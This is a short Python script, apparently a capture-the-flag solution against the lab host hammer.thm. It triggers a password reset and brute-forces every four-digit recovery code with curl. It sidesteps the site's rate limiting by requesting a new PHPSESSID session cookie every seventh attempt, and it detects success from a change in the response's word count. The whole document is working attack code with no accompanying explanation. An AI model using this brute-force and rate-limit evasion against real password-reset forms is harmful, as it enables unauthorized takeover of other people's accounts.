import subprocess

def get_phpsessid():
    # Request Password Reset and retrieve the PHPSESSID cookie
    reset_command = [
        "curl", "-X", "POST", "http://hammer.thm:1337/reset_password.php",
        "-d", "email=tester%40hammer.thm",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-v"
    ]

    # Execute the curl command and capture the output
    response = subprocess.run(reset_command, capture_output=True, text=True)

    # Extract PHPSESSID from the response
    phpsessid = None
    for line in response.stderr.splitlines():
        if "Set-Cookie: PHPSESSID=" in line:
            phpsessid = line.split("PHPSESSID=")[1].split(";")[0]
            break

    return phpsessid

def submit_recovery_code(phpsessid, recovery_code):
    # Submit Recovery Code using the retrieved PHPSESSID
    recovery_command = [
        "curl", "-X", "POST", "http://hammer.thm:1337/reset_password.php",
        "-d", f"recovery_code={recovery_code}&s=180",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", f"Cookie: PHPSESSID={phpsessid}",
        "--silent"
    ]

    # Execute the curl command for recovery code submission
    response_recovery = subprocess.run(recovery_command, capture_output=True, text=True)
    return response_recovery.stdout

def main():
    phpsessid = get_phpsessid()
    if not phpsessid:
        print("Failed to retrieve initial PHPSESSID. Exiting...")
        return
    
    for i in range(10000):
        recovery_code = f"{i:04d}"  # Format the recovery code as a 4-digit string

        if i % 7 == 0:  # Every 7th request, get a new PHPSESSID
            phpsessid = get_phpsessid()
            if not phpsessid:
                print(f"Failed to retrieve PHPSESSID at attempt {i}. Retrying...")
                continue
        
        response_text = submit_recovery_code(phpsessid, recovery_code)
        word_count = len(response_text.split())

        if word_count != 148:
            print(f"Success! Recovery Code: {recovery_code}")
            print(f"PHPSESSID: {phpsessid}")
            print(f"Response Text: {response_text}")
            break

if __name__ == "__main__":
    main()